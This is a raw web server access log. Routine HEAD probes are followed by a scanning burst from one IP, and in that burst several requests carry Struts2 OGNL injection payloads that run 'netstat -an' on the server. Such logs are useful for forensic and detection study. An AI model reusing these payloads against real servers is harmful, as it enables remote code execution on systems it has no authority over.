80.82.78.38 - - [13/Nov/2016:00:00:05 +0800] "GET http://www.baidu.com/cache/global/img/gs.gif HTTP/1.1" 404 221
58.32.44.98 - - [13/Nov/2016:02:16:56 +0800] "HEAD / HTTP/1.1" 302 -
113.95.12.85 - - [13/Nov/2016:02:20:49 +0800] "HEAD / HTTP/1.1" 302 -
111.192.102.34 - - [13/Nov/2016:02:21:11 +0800] "HEAD / HTTP/1.1" 302 -
113.95.12.85 - - [13/Nov/2016:02:21:20 +0800] "HEAD / HTTP/1.1" 302 -
111.192.102.34 - - [13/Nov/2016:02:21:42 +0800] "HEAD / HTTP/1.1" 302 -
58.32.44.98 - - [13/Nov/2016:02:21:56 +0800] "HEAD / HTTP/1.1" 302 -
113.95.12.85 - - [13/Nov/2016:02:25:49 +0800] "HEAD / HTTP/1.1" 302 -
111.192.102.34 - - [13/Nov/2016:02:26:11 +0800] "HEAD / HTTP/1.1" 302 -
113.95.12.85 - - [13/Nov/2016:02:26:20 +0800] "HEAD / HTTP/1.1" 302 -
111.192.102.34 - - [13/Nov/2016:02:26:42 +0800] "HEAD / HTTP/1.1" 302 -
58.32.44.98 - - [13/Nov/2016:02:26:56 +0800] "HEAD / HTTP/1.1" 302 -
66.249.79.164 - - [13/Nov/2016:02:29:54 +0800] "GET /sxzn/css/displaytag.css HTTP/1.1" 200 2309
113.95.12.85 - - [13/Nov/2016:02:30:49 +0800] "HEAD / HTTP/1.1" 302 -
111.192.102.34 - - [13/Nov/2016:02:31:12 +0800] "HEAD / HTTP/1.1" 302 -
113.95.12.85 - - [13/Nov/2016:02:31:20 +0800] "HEAD / HTTP/1.1" 302 -
111.192.102.34 - - [13/Nov/2016:02:31:42 +0800] "HEAD / HTTP/1.1" 302 -
58.32.44.98 - - [13/Nov/2016:02:31:56 +0800] "HEAD / HTTP/1.1" 302 -
113.95.12.85 - - [13/Nov/2016:02:35:50 +0800] "HEAD / HTTP/1.1" 302 -
111.192.102.34 - - [13/Nov/2016:02:36:12 +0800] "HEAD / HTTP/1.1" 302 -
113.95.12.85 - - [13/Nov/2016:02:36:21 +0800] "HEAD / HTTP/1.1" 302 -
111.192.102.34 - - [13/Nov/2016:02:36:41 +0800] "HEAD / HTTP/1.1" 302 -
58.32.44.98 - - [13/Nov/2016:02:36:55 +0800] "HEAD / HTTP/1.1" 302 -
113.95.12.85 - - [13/Nov/2016:02:40:49 +0800] "HEAD / HTTP/1.1" 302 -
111.192.102.34 - - [13/Nov/2016:02:41:11 +0800] "HEAD / HTTP/1.1" 302 -
113.95.12.85 - - [13/Nov/2016:02:41:23 +0800] "HEAD / HTTP/1.1" 302 -
111.192.102.34 - - [13/Nov/2016:02:41:41 +0800] "HEAD / HTTP/1.1" 302 -
58.32.44.98 - - [13/Nov/2016:02:41:55 +0800] "HEAD / HTTP/1.1" 302 -
113.95.12.85 - - [13/Nov/2016:02:45:49 +0800] "HEAD / HTTP/1.1" 302 -
111.192.102.34 - - [13/Nov/2016:02:46:11 +0800] "HEAD / HTTP/1.1" 302 -
113.95.12.85 - - [13/Nov/2016:02:46:19 +0800] "HEAD / HTTP/1.1" 302 -
111.192.102.34 - - [13/Nov/2016:02:46:42 +0800] "HEAD / HTTP/1.1" 302 -
58.32.44.98 - - [13/Nov/2016:02:46:56 +0800] "HEAD / HTTP/1.1" 302 -
113.95.12.85 - - [13/Nov/2016:02:50:49 +0800] "HEAD / HTTP/1.1" 302 -
111.192.102.34 - - [13/Nov/2016:02:51:11 +0800] "HEAD / HTTP/1.1" 302 -
113.95.12.85 - - [13/Nov/2016:02:51:20 +0800] "HEAD / HTTP/1.1" 302 -
111.192.102.34 - - [13/Nov/2016:02:51:42 +0800] "HEAD / HTTP/1.1" 302 -
58.32.44.98 - - [13/Nov/2016:02:51:56 +0800] "HEAD / HTTP/1.1" 302 -
113.95.12.85 - - [13/Nov/2016:02:55:49 +0800] "HEAD / HTTP/1.1" 302 -
111.192.102.34 - - [13/Nov/2016:02:56:11 +0800] "HEAD / HTTP/1.1" 302 -
113.95.12.85 - - [13/Nov/2016:02:56:20 +0800] "HEAD / HTTP/1.1" 302 -
111.192.102.34 - - [13/Nov/2016:02:56:41 +0800] "HEAD / HTTP/1.1" 302 -
58.32.44.98 - - [13/Nov/2016:02:56:56 +0800] "HEAD / HTTP/1.1" 302 -
113.95.12.85 - - [13/Nov/2016:03:00:49 +0800] "HEAD / HTTP/1.1" 302 -
111.192.102.34 - - [13/Nov/2016:03:01:11 +0800] "HEAD / HTTP/1.1" 302 -
113.95.12.85 - - [13/Nov/2016:03:01:19 +0800] "HEAD / HTTP/1.1" 302 -
111.192.102.34 - - [13/Nov/2016:03:01:42 +0800] "HEAD / HTTP/1.1" 302 -
58.32.44.98 - - [13/Nov/2016:03:01:55 +0800] "HEAD / HTTP/1.1" 302 -
176.61.137.208 - - [13/Nov/2016:03:02:05 +0800] "GET / HTTP/1.1" 302 -
113.95.12.85 - - [13/Nov/2016:03:05:49 +0800] "HEAD / HTTP/1.1" 302 -
111.192.102.34 - - [13/Nov/2016:03:06:11 +0800] "HEAD / HTTP/1.1" 302 -
113.95.12.85 - - [13/Nov/2016:03:06:19 +0800] "HEAD / HTTP/1.1" 302 -
111.192.102.34 - - [13/Nov/2016:03:06:41 +0800] "HEAD / HTTP/1.1" 302 -
58.32.44.98 - - [13/Nov/2016:03:06:55 +0800] "HEAD / HTTP/1.1" 302 -
113.95.12.85 - - [13/Nov/2016:03:10:49 +0800] "HEAD / HTTP/1.1" 302 -
111.192.102.34 - - [13/Nov/2016:03:11:11 +0800] "HEAD / HTTP/1.1" 302 -
113.95.12.85 - - [13/Nov/2016:03:11:19 +0800] "HEAD / HTTP/1.1" 302 -
111.192.102.34 - - [13/Nov/2016:03:11:42 +0800] "HEAD / HTTP/1.1" 302 -
58.32.44.98 - - [13/Nov/2016:03:11:55 +0800] "HEAD / HTTP/1.1" 302 -
113.95.12.85 - - [13/Nov/2016:03:15:49 +0800] "HEAD / HTTP/1.1" 302 -
111.192.102.34 - - [13/Nov/2016:03:16:11 +0800] "HEAD / HTTP/1.1" 302 -
113.95.12.85 - - [13/Nov/2016:03:16:19 +0800] "HEAD / HTTP/1.1" 302 -
111.192.102.34 - - [13/Nov/2016:03:16:42 +0800] "HEAD / HTTP/1.1" 302 -
58.32.44.98 - - [13/Nov/2016:03:16:55 +0800] "HEAD / HTTP/1.1" 302 -
113.95.12.85 - - [13/Nov/2016:03:20:49 +0800] "HEAD / HTTP/1.1" 302 -
111.192.102.34 - - [13/Nov/2016:03:21:11 +0800] "HEAD / HTTP/1.1" 302 -
113.95.12.85 - - [13/Nov/2016:03:21:19 +0800] "HEAD / HTTP/1.1" 302 -
111.192.102.34 - - [13/Nov/2016:03:21:42 +0800] "HEAD / HTTP/1.1" 302 -
58.32.44.98 - - [13/Nov/2016:03:21:56 +0800] "HEAD / HTTP/1.1" 302 -
113.95.12.85 - - [13/Nov/2016:03:25:49 +0800] "HEAD / HTTP/1.1" 302 -
111.192.102.34 - - [13/Nov/2016:03:26:11 +0800] "HEAD / HTTP/1.1" 302 -
113.95.12.85 - - [13/Nov/2016:03:26:19 +0800] "HEAD / HTTP/1.1" 302 -
111.192.102.34 - - [13/Nov/2016:03:26:42 +0800] "HEAD / HTTP/1.1" 302 -
58.32.44.98 - - [13/Nov/2016:03:26:55 +0800] "HEAD / HTTP/1.1" 302 -
113.95.12.85 - - [13/Nov/2016:03:30:49 +0800] "HEAD / HTTP/1.1" 302 -
111.192.102.34 - - [13/Nov/2016:03:31:10 +0800] "HEAD / HTTP/1.1" 302 -
113.95.12.85 - - [13/Nov/2016:03:31:20 +0800] "HEAD / HTTP/1.1" 302 -
111.192.102.34 - - [13/Nov/2016:03:31:42 +0800] "HEAD / HTTP/1.1" 302 -
58.32.44.98 - - [13/Nov/2016:03:31:55 +0800] "HEAD / HTTP/1.1" 302 -
113.95.12.85 - - [13/Nov/2016:03:35:49 +0800] "HEAD / HTTP/1.1" 302 -
111.192.102.34 - - [13/Nov/2016:03:36:11 +0800] "HEAD / HTTP/1.1" 302 -
113.95.12.85 - - [13/Nov/2016:03:36:20 +0800] "HEAD / HTTP/1.1" 302 -
111.192.102.34 - - [13/Nov/2016:03:36:41 +0800] "HEAD / HTTP/1.1" 302 -
58.32.44.98 - - [13/Nov/2016:03:36:55 +0800] "HEAD / HTTP/1.1" 302 -
113.95.12.85 - - [13/Nov/2016:03:40:48 +0800] "HEAD / HTTP/1.1" 302 -
111.192.102.34 - - [13/Nov/2016:03:41:11 +0800] "HEAD / HTTP/1.1" 302 -
113.95.12.85 - - [13/Nov/2016:03:41:19 +0800] "HEAD / HTTP/1.1" 302 -
111.192.102.34 - - [13/Nov/2016:03:41:41 +0800] "HEAD / HTTP/1.1" 302 -
58.32.44.98 - - [13/Nov/2016:03:41:55 +0800] "HEAD / HTTP/1.1" 302 -
113.95.12.85 - - [13/Nov/2016:03:45:49 +0800] "HEAD / HTTP/1.1" 302 -
111.192.102.34 - - [13/Nov/2016:03:46:11 +0800] "HEAD / HTTP/1.1" 302 -
113.95.12.85 - - [13/Nov/2016:03:46:20 +0800] "HEAD / HTTP/1.1" 302 -
111.192.102.34 - - [13/Nov/2016:03:46:41 +0800] "HEAD / HTTP/1.1" 302 -
58.32.44.98 - - [13/Nov/2016:03:46:55 +0800] "HEAD / HTTP/1.1" 302 -
113.95.12.85 - - [13/Nov/2016:03:50:49 +0800] "HEAD / HTTP/1.1" 302 -
111.192.102.34 - - [13/Nov/2016:03:51:12 +0800] "HEAD / HTTP/1.1" 302 -
113.95.12.85 - - [13/Nov/2016:03:51:20 +0800] "HEAD / HTTP/1.1" 302 -
111.192.102.34 - - [13/Nov/2016:03:51:42 +0800] "HEAD / HTTP/1.1" 302 -
58.32.44.98 - - [13/Nov/2016:03:51:55 +0800] "HEAD / HTTP/1.1" 302 -
113.95.12.85 - - [13/Nov/2016:03:55:49 +0800] "HEAD / HTTP/1.1" 302 -
111.192.102.34 - - [13/Nov/2016:03:56:10 +0800] "HEAD / HTTP/1.1" 302 -
113.95.12.85 - - [13/Nov/2016:03:56:20 +0800] "HEAD / HTTP/1.1" 302 -
111.192.102.34 - - [13/Nov/2016:03:56:41 +0800] "HEAD / HTTP/1.1" 302 -
58.32.44.98 - - [13/Nov/2016:03:56:56 +0800] "HEAD / HTTP/1.1" 302 -
113.95.12.85 - - [13/Nov/2016:04:00:49 +0800] "HEAD / HTTP/1.1" 302 -
111.192.102.34 - - [13/Nov/2016:04:01:10 +0800] "HEAD / HTTP/1.1" 302 -
113.95.12.85 - - [13/Nov/2016:04:01:19 +0800] "HEAD / HTTP/1.1" 302 -
111.192.102.34 - - [13/Nov/2016:04:01:44 +0800] "HEAD / HTTP/1.1" 302 -
58.32.44.98 - - [13/Nov/2016:04:01:55 +0800] "HEAD / HTTP/1.1" 302 -
123.206.194.143 - - [13/Nov/2016:04:03:24 +0800] "GET / HTTP/1.1" 302 -
123.206.194.143 - - [13/Nov/2016:04:03:24 +0800] "GET / HTTP/1.1" 302 -
123.206.194.143 - - [13/Nov/2016:04:03:24 +0800] "GET / HTTP/1.1" 302 -
123.206.194.143 - - [13/Nov/2016:04:03:25 +0800] "GET /por/login_psw.csp HTTP/1.1" 404 1006
123.206.194.143 - - [13/Nov/2016:04:03:25 +0800] "GET / HTTP/1.1" 302 -
123.206.194.143 - - [13/Nov/2016:04:03:24 +0800] "GET /sxzn/ HTTP/1.1" 200 18752
123.206.194.143 - - [13/Nov/2016:04:03:24 +0800] "GET /sxzn/ HTTP/1.1" 200 18752
123.206.194.143 - - [13/Nov/2016:04:03:24 +0800] "GET /sxzn/ HTTP/1.1" 200 18752
123.206.194.143 - - [13/Nov/2016:04:03:24 +0800] "GET /sxzn/ HTTP/1.1" 200 18752
123.206.194.143 - - [13/Nov/2016:04:03:24 +0800] "GET /sxzn/ HTTP/1.1" 200 18752
123.206.194.143 - - [13/Nov/2016:04:03:29 +0800] "GET /sxzn/rand.action?debug=command&expression=%23context[%22xwork.MethodAccessor.denyMethodExecution%22]=false,%23f=%23_memberAccess.getClass().getDeclaredField(%22allowStaticMethodAccess%22),%23f.setAccessible(true),%23f.set(%23_memberAccess,true),%23a=@java.lang.Runtime@getRuntime().exec(%22netstat%20-an%22).getInputStream(),%23b=new%20java.io.InputStreamReader(%23a),%23c=new%20java.io.BufferedReader(%23b),%23d=new%20char[50000],%23c.read(%23d),%23genxor=%23context.get(%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22).getWriter(),%23genxor.println(%23d),%23genxor.flush(),%23genxor.close() HTTP/1.1" 200 1187
123.206.194.143 - - [13/Nov/2016:04:03:29 +0800] "GET /sxzn/rand.action?debug=command&expression=%23f=%23_memberAccess.getClass().getDeclaredField(%27allowStaticMethodAccess%27),%23f.setAccessible(true),%23f.set(%23_memberAccess,true),%23req=@org.apache.struts2.ServletActionContext@getRequest(),%23resp=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),%23a=(new%20java.lang.ProcessBuilder(new%20java.lang.String[]%7B%27netstat%27%7D)).start(),%23b=%23a.getInputStream(),%23c=new%20java.io.InputStreamReader(%23b),%23d=new%20java.io.BufferedReader(%23c),%23e=new%20char[4000],%23d.read(%23e),%23resp.println(%23e),%23resp.close() HTTP/1.1" 200 1322
123.206.194.143 - - [13/Nov/2016:04:03:30 +0800] "GET /sxzn/rand.action?method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse%28%29,%23res.setCharacterEncoding%28%23parameters.encoding[0]%29,%23w%3d%23res.getWriter%28%29,%23s%3dnew+java.util.Scanner%28@java.lang.Runtime@getRuntime%28%29.exec%28%23parameters.cmd[0]%29.getInputStream%28%29%29.useDelimiter%28%23parameters.pp[0]%29,%23str%3d%23s.hasNext%28%29%3f%23s.next%28%29%3a%23parameters.ppp[0],%23w.print%28%23str%29,%23w.close%28%29,1?%23xx:%23request.toString&cmd=netstat%20-an&pp=\\A&ppp=%20&encoding=UTF-8 HTTP/1.1" 200 1277
123.206.194.143 - - [13/Nov/2016:04:03:30 +0800] "GET /sxzn/rand.action?debug=command&expression=%23f=%23_memberAccess.getClass().getDeclaredField(%27allowStaticMethodAccess%27),%23f.setAccessible(true),%23f.set(%23_memberAccess,true),%23req=@org.apache.struts2.ServletActionContext@getRequest(),%23resp=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),%23a=(new%20java.lang.ProcessBuilder(new%20java.lang.String[]%7B%27netstat%27%7D)).start(),%23b=%23a.getInputStream(),%23c=new%20java.io.InputStreamReader(%23b),%23d=new%20java.io.BufferedReader(%23c),%23e=new%20char[4000],%23d.read(%23e),%23resp.println(%23e),%23resp.close() HTTP/1.1" 200 1311
123.206.194.143 - - [13/Nov/2016:04:03:30 +0800] "GET /sxzn/rand.action?redirect:$%7B%23a%3dnew%20java.lang.ProcessBuilder(new%20java.lang.String[]%7B%22netstat%22,%22-an%22%7D).start().getInputStream(),%23b%3dnew%20java.io.InputStreamReader(%23a),%23c%3dnew%20java.io.BufferedReader(%23b),%23d%3dnew%20char[51020],%23c.read(%23d),%23screen%3d%23context.get(%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27).getWriter(),%23screen.println(%23d),%23screen.close()%7D HTTP/1.1" 200 1276
123.206.194.143 - - [13/Nov/2016:04:03:32 +0800] "GET /sxzn/sxzn/index.action?redirect:$%7B%23a%3dnew%20java.lang.ProcessBuilder(new%20java.lang.String[]%7B%22netstat%22,%22-an%22%7D).start().getInputStream(),%23b%3dnew%20java.io.InputStreamReader(%23a),%23c%3dnew%20java.io.BufferedReader(%23b),%23d%3dnew%20char[51020],%23c.read(%23d),%23screen%3d%23context.get(%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27).getWriter(),%23screen.println(%23d),%23screen.close()%7D HTTP/1.1" 200 18752
123.206.194.143 - - [13/Nov/2016:04:03:32 +0800] "GET /sxzn/sxzn/index.action?debug=command&expression=%23f=%23_memberAccess.getClass().getDeclaredField(%27allowStaticMethodAccess%27),%23f.setAccessible(true),%23f.set(%23_memberAccess,true),%23req=@org.apache.struts2.ServletActionContext@getRequest(),%23resp=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),%23a=(new%20java.lang.ProcessBuilder(new%20java.lang.String[]%7B%27netstat%27%7D)).start(),%23b=%23a.getInputStream(),%23c=new%20java.io.InputStreamReader(%23b),%23d=new%20java.io.BufferedReader(%23c),%23e=new%20char[4000],%23d.read(%23e),%23resp.println(%23e),%23resp.close() HTTP/1.1" 200 18752
123.206.194.143 - - [13/Nov/2016:04:03:32 +0800] "GET /sxzn/sxzn/index.action?debug=command&expression=%23context[%22xwork.MethodAccessor.denyMethodExecution%22]=false,%23f=%23_memberAccess.getClass().getDeclaredField(%22allowStaticMethodAccess%22),%23f.setAccessible(true),%23f.set(%23_memberAccess,true),%23a=@java.lang.Runtime@getRuntime().exec(%22netstat%20-an%22).getInputStream(),%23b=new%20java.io.InputStreamReader(%23a),%23c=new%20java.io.BufferedReader(%23b),%23d=new%20char[50000],%23c.read(%23d),%23genxor=%23context.get(%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22).getWriter(),%23genxor.println(%23d),%23genxor.flush(),%23genxor.close() HTTP/1.1" 200 18752
123.206.194.143 - - [13/Nov/2016:04:03:32 +0800] "GET /sxzn/sxzn/index.action?debug=command&expression=%23f=%23_memberAccess.getClass().getDeclaredField(%27allowStaticMethodAccess%27),%23f.setAccessible(true),%23f.set(%23_memberAccess,true),%23req=@org.apache.struts2.ServletActionContext@getRequest(),%23resp=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),%23a=(new%20java.lang.ProcessBuilder(new%20java.lang.String[]%7B%27netstat%27%7D)).start(),%23b=%23a.getInputStream(),%23c=new%20java.io.InputStreamReader(%23b),%23d=new%20java.io.BufferedReader(%23c),%23e=new%20char[4000],%23d.read(%23e),%23resp.println(%23e),%23resp.close() HTTP/1.1" 200 18752
123.206.194.143 - - [13/Nov/2016:04:03:32 +0800] "GET /sxzn/sxzn/index.action?method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse%28%29,%23res.setCharacterEncoding%28%23parameters.encoding[0]%29,%23w%3d%23res.getWriter%28%29,%23s%3dnew+java.util.Scanner%28@java.lang.Runtime@getRuntime%28%29.exec%28%23parameters.cmd[0]%29.getInputStream%28%29%29.useDelimiter%28%23parameters.pp[0]%29,%23str%3d%23s.hasNext%28%29%3f%23s.next%28%29%3a%23parameters.ppp[0],%23w.print%28%23str%29,%23w.close%28%29,1?%23xx:%23request.toString&cmd=netstat%20-an&pp=\\A&ppp=%20&encoding=UTF-8 HTTP/1.1" 200 18752
123.206.194.143 - - [13/Nov/2016:04:03:33 +0800] "GET /sxzn/sxzn/foreground/browseMetadata.action?method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse%28%29,%23res.setCharacterEncoding%28%23parameters.encoding[0]%29,%23w%3d%23res.getWriter%28%29,%23s%3dnew+java.util.Scanner%28@java.lang.Runtime@getRuntime%28%29.exec%28%23parameters.cmd[0]%29.getInputStream%28%29%29.useDelimiter%28%23parameters.pp[0]%29,%23str%3d%23s.hasNext%28%29%3f%23s.next%28%29%3a%23parameters.ppp[0],%23w.print%28%23str%29,%23w.close%28%29,1?%23xx:%23request.toString&cmd=netstat%20-an&pp=\\A&ppp=%20&encoding=UTF-8 HTTP/1.1" 200 30694
123.206.194.143 - - [13/Nov/2016:04:03:33 +0800] "GET /sxzn/sxzn/foreground/browseMetadata.action?debug=command&expression=%23context[%22xwork.MethodAccessor.denyMethodExecution%22]=false,%23f=%23_memberAccess.getClass().getDeclaredField(%22allowStaticMethodAccess%22),%23f.setAccessible(true),%23f.set(%23_memberAccess,true),%23a=@java.lang.Runtime@getRuntime().exec(%22netstat%20-an%22).getInputStream(),%23b=new%20java.io.InputStreamReader(%23a),%23c=new%20java.io.BufferedReader(%23b),%23d=new%20char[50000],%23c.read(%23d),%23genxor=%23context.get(%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22).getWriter(),%23genxor.println(%23d),%23genxor.flush(),%23genxor.close() HTTP/1.1" 200 32611
123.206.194.143 - - [13/Nov/2016:04:03:33 +0800] "GET /sxzn/sxzn/foreground/browseMetadata.action?debug=command&expression=%23f=%23_memberAccess.getClass().getDeclaredField(%27allowStaticMethodAccess%27),%23f.setAccessible(true),%23f.set(%23_memberAccess,true),%23req=@org.apache.struts2.ServletActionContext@getRequest(),%23resp=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),%23a=(new%20java.lang.ProcessBuilder(new%20java.lang.String[]%7B%27netstat%27%7D)).start(),%23b=%23a.getInputStream(),%23c=new%20java.io.InputStreamReader(%23b),%23d=new%20java.io.BufferedReader(%23c),%23e=new%20char[4000],%23d.read(%23e),%23resp.println(%23e),%23resp.close() HTTP/1.1" 200 32566
123.206.194.143 - - [13/Nov/2016:04:03:33 +0800] "GET /sxzn/sxzn/foreground/browseMetadata.action?debug=command&expression=%23f=%23_memberAccess.getClass().getDeclaredField(%27allowStaticMethodAccess%27),%23f.setAccessible(true),%23f.set(%23_memberAccess,true),%23req=@org.apache.struts2.ServletActionContext@getRequest(),%23resp=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),%23a=(new%20java.lang.ProcessBuilder(new%20java.lang.String[]%7B%27netstat%27%7D)).start(),%23b=%23a.getInputStream(),%23c=new%20java.io.InputStreamReader(%23b),%23d=new%20java.io.BufferedReader(%23c),%23e=new%20char[4000],%23d.read(%23e),%23resp.println(%23e),%23resp.close() HTTP/1.1" 200 32566
123.206.194.143 - - [13/Nov/2016:04:03:33 +0800] "GET /sxzn/sxzn/foreground/browseMetadata.action?redirect:$%7B%23a%3dnew%20java.lang.ProcessBuilder(new%20java.lang.String[]%7B%22netstat%22,%22-an%22%7D).start().getInputStream(),%23b%3dnew%20java.io.InputStreamReader(%23a),%23c%3dnew%20java.io.BufferedReader(%23b),%23d%3dnew%20char[51020],%23c.read(%23d),%23screen%3d%23context.get(%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27).getWriter(),%23screen.println(%23d),%23screen.close()%7D HTTP/1.1" 200 29578
123.206.194.143 - - [13/Nov/2016:04:03:36 +0800] "GET /sxzn/checkLogin.action?debug=command&expression=%23context[%22xwork.MethodAccessor.denyMethodExecution%22]=false,%23f=%23_memberAccess.getClass().getDeclaredField(%22allowStaticMethodAccess%22),%23f.setAccessible(true),%23f.set(%23_memberAccess,true),%23a=@java.lang.Runtime@getRuntime().exec(%22netstat%20-an%22).getInputStream(),%23b=new%20java.io.InputStreamReader(%23a),%23c=new%20java.io.BufferedReader(%23b),%23d=new%20char[50000],%23c.read(%23d),%23genxor=%23context.get(%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22).getWriter(),%23genxor.println(%23d),%23genxor.flush(),%23genxor.close() HTTP/1.1" 200 7386
123.206.194.143 - - [13/Nov/2016:04:03:36 +0800] "GET /sxzn/checkLogin.action?method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse%28%29,%23res.setCharacterEncoding%28%23parameters.encoding[0]%29,%23w%3d%23res.getWriter%28%29,%23s%3dnew+java.util.Scanner%28@java.lang.Runtime@getRuntime%28%29.exec%28%23parameters.cmd[0]%29.getInputStream%28%29%29.useDelimiter%28%23parameters.pp[0]%29,%23str%3d%23s.hasNext%28%29%3f%23s.next%28%29%3a%23parameters.ppp[0],%23w.print%28%23str%29,%23w.close%28%29,1?%23xx:%23request.toString&cmd=netstat%20-an&pp=\\A&ppp=%20&encoding=UTF-8 HTTP/1.1" 200 7386
123.206.194.143 - - [13/Nov/2016:04:03:37 +0800] "GET /sxzn/checkLogin.action?redirect:$%7B%23a%3dnew%20java.lang.ProcessBuilder(new%20java.lang.String[]%7B%22netstat%22,%22-an%22%7D).start().getInputStream(),%23b%3dnew%20java.io.InputStreamReader(%23a),%23c%3dnew%20java.io.BufferedReader(%23b),%23d%3dnew%20char[51020],%23c.read(%23d),%23screen%3d%23context.get(%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27).getWriter(),%23screen.println(%23d),%23screen.close()%7D HTTP/1.1" 200 7386
123.206.194.143 - - [13/Nov/2016:04:03:37 +0800] "GET /sxzn/checkLogin.action?debug=command&expression=%23f=%23_memberAccess.getClass().getDeclaredField(%27allowStaticMethodAccess%27),%23f.setAccessible(true),%23f.set(%23_memberAccess,true),%23req=@org.apache.struts2.ServletActionContext@getRequest(),%23resp=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),%23a=(new%20java.lang.ProcessBuilder(new%20java.lang.String[]%7B%27netstat%27%7D)).start(),%23b=%23a.getInputStream(),%23c=new%20java.io.InputStreamReader(%23b),%23d=new%20java.io.BufferedReader(%23c),%23e=new%20char[4000],%23d.read(%23e),%23resp.println(%23e),%23resp.close() HTTP/1.1" 200 7386
123.206.194.143 - - [13/Nov/2016:04:03:38 +0800] "GET /sxzn/checkLogin.action?debug=command&expression=%23f=%23_memberAccess.getClass().getDeclaredField(%27allowStaticMethodAccess%27),%23f.setAccessible(true),%23f.set(%23_memberAccess,true),%23req=@org.apache.struts2.ServletActionContext@getRequest(),%23resp=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),%23a=(new%20java.lang.ProcessBuilder(new%20java.lang.String[]%7B%27netstat%27%7D)).start(),%23b=%23a.getInputStream(),%23c=new%20java.io.InputStreamReader(%23b),%23d=new%20java.io.BufferedReader(%23c),%23e=new%20char[4000],%23d.read(%23e),%23resp.println(%23e),%23resp.close() HTTP/1.1" 200 7386
123.206.194.143 - - [13/Nov/2016:04:03:38 +0800] "GET /sxzn/location.href='readPolicy.action?method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse%28%29,%23res.setCharacterEncoding%28%23parameters.encoding[0]%29,%23w%3d%23res.getWriter%28%29,%23s%3dnew+java.util.Scanner%28@java.lang.Runtime@getRuntime%28%29.exec%28%23parameters.cmd[0]%29.getInputStream%28%29%29.useDelimiter%28%23parameters.pp[0]%29,%23str%3d%23s.hasNext%28%29%3f%23s.next%28%29%3a%23parameters.ppp[0],%23w.print%28%23str%29,%23w.close%28%29,1?%23xx:%23request.toString&cmd=netstat%20-an&pp=\\A&ppp=%20&encoding=UTF-8 HTTP/1.1" 500 1718
123.206.194.143 - - [13/Nov/2016:04:03:38 +0800] "GET /sxzn/location.href='readPolicy.action?debug=command&expression=%23context[%22xwork.MethodAccessor.denyMethodExecution%22]=false,%23f=%23_memberAccess.getClass().getDeclaredField(%22allowStaticMethodAccess%22),%23f.setAccessible(true),%23f.set(%23_memberAccess,true),%23a=@java.lang.Runtime@getRuntime().exec(%22netstat%20-an%22).getInputStream(),%23b=new%20java.io.InputStreamReader(%23a),%23c=new%20java.io.BufferedReader(%23b),%23d=new%20char[50000],%23c.read(%23d),%23genxor=%23context.get(%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22).getWriter(),%23genxor.println(%23d),%23genxor.flush(),%23genxor.close() HTTP/1.1" 500 1718
